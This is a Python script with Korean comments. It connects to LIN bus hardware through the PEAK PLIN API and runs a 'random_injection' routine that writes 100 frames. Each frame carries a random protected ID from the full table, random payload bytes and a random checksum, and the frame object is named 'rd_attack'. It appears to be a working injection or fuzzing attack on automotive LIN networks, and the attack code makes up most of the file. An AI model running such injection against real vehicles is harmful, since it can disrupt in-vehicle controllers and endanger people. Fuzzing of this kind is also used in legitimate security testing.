from PLinApi import *
from ctypes import c_ushort, byref, sizeof, create_string_buffer
import time
import random

# PLIN API 객체 생성
LIN = PLinApi()

# LIN 클라이언트 등록
client_name = "MyLINClient"
hWnd = 0
hClient = HLINCLIENT()

register_result = LIN.RegisterClient(client_name, hWnd, hClient)
if register_result == TLIN_ERROR_OK:
    print("Client registered successfully with handle: ", hClient.value)
else:
    print("Failed to register client. Error code: ", register_result)
    exit()

# 사용 가능한 하드웨어 가져오기
num_hw = c_ushort()
hardware_buffer = (HLINHW * 10)()

avail_result = LIN.GetAvailableHardware(hardware_buffer, sizeof(hardware_buffer), num_hw)

if avail_result != TLIN_ERROR_OK:
    print(f"Failed to get available hardware. Error code: {avail_result}")
else:
    print(f"Number of Available Hardware: {num_hw.value}")

    if num_hw.value > 0:
        for i in range(num_hw.value):
            print(f"Hardware {i + 1} Handle: {hardware_buffer[i]}")
    else:
        print("No hardware available.")
    hHw = hardware_buffer[0]

# 클라이언트와 하드웨어 연결
connect_result = LIN.ConnectClient(hClient, hHw)
if connect_result == TLIN_ERROR_OK:
    print("Success Connection!!")
else:
    print("Failed to connect. Error code: ", connect_result)
    exit()

# 하드웨어 초기화
language_id = 0 
error_text_buffer = create_string_buffer(256)
master = TLIN_HARDWAREMODE_MASTER
slave = TLIN_HARDWAREMODE_SLAVE

init_result = LIN.InitializeHardware(hClient, hHw, slave, 19200)
if init_result != TLIN_ERROR_OK:
    print("Failed to initialize hardware.")
    LIN.GetErrorText(init_result, language_id, error_text_buffer, len(error_text_buffer))
    print(error_text_buffer.value)
    exit()
else:
    print("Hardware Initialized Successfully!")

# LIN 메시지 전송
def random_injection():
    for i in range(100):
        pids = [0x80, 0xC1, 0x42, 0x03, 0xC4, 0x85, 0x06, 0x47, 0x08, 0x49, 0xCA, 0x8B, 0x4C, 0x0D, 0x8E, 0xCF,
                0x50, 0x11, 0x92, 0xD3, 0x14, 0x55, 0xD6, 0x97, 0xD8, 0x99, 0x1A, 0x5B, 0x9C, 0xDD, 0x5E, 0x1F,
                0x20, 0x61, 0xE2, 0xA3, 0x64, 0x25, 0xA6, 0xE7, 0xA8, 0xE9, 0x6A, 0x2B, 0xEC, 0xAD, 0x2E, 0x6F,
                0xF0, 0xB1, 0x32, 0x73, 0xB4, 0xF5, 0x76, 0x37, 0x78, 0x39, 0xBA, 0xFB, 0x3C, 0x7D, 0xFE, 0xBF
                ]

        data_array = (c_ubyte * 8)(
            random.randrange(0, 256),
            random.randrange(0, 256),
            random.randrange(0, 256),
            random.randrange(0, 256),
            random.randrange(0, 256),
            random.randrange(0, 256),
            random.randrange(0, 256),
            random.randrange(0, 256)
        )

        rd_checksum = random.randrange(0, 256)

        rd_attack = TLINMsg()
        rd_attack.FrameId = random.choice(pids)
        rd_attack.Length = 8
        rd_attack.ChecksumType = TLIN_CHECKSUMTYPE_ENHANCED
        rd_attack.Direction = TLIN_DIRECTION_PUBLISHER
        rd_attack.Data = data_array
        rd_attack.Checksum = rd_checksum
        data = '\t'.join([f"0x{d:02x}" for d in rd_attack.Data])

        wResult = LIN.Write(hClient, hHw, rd_attack)
        if wResult == TLIN_ERROR_OK:
            print("ID:", rd_attack.FrameId, "Data:", data, "Checksum:", rd_attack.Checksum)
        else:
            print("Error: ", wResult)

        time.sleep(0.1)

random_injection()


# 클라이언트와 하드웨어 연결 해제
disconnect_result = LIN.DisconnectClient(hClient, hHw)
if disconnect_result == TLIN_ERROR_OK:
    print("Disconnected successfully.")
else:
    print("Failed to disconnect. Error code: ", disconnect_result)

# 클라이언트 해제
unregister_result = LIN.RemoveClient(hClient)
if unregister_result == TLIN_ERROR_OK:
    print("Client unregistered successfully.")
else:
    print("Failed to unregister client. Error code: ", unregister_result)